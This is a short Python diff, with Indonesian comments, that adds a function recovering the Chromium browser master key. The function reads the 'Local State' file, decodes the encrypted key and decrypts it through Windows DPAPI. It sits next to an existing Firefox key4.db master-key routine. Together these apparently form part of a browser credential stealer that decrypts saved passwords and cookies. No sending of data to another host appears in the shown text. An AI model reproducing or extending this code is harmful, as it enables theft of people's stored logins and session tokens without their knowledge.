@@ -28,7 +28,20 @@ data_queries = {
     }
 }
 
+def get_master_key_chromium(path):
+    """Mengambil Master Key untuk browser berbasis Chromium"""
+    local_state_path = os.path.join(path, "Local State")
+    if not os.path.exists(local_state_path):
+        return None
 
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+
+    encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+    encrypted_key = encrypted_key[5:]  # Hilangkan prefix "DPAPI"
+    master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    return master_key
+    
 def get_firefox_master_key(profile):
     """Ambil Master Key dari Firefox"""
     key_db = os.path.join(firefox_dir, profile, 'key4.db')
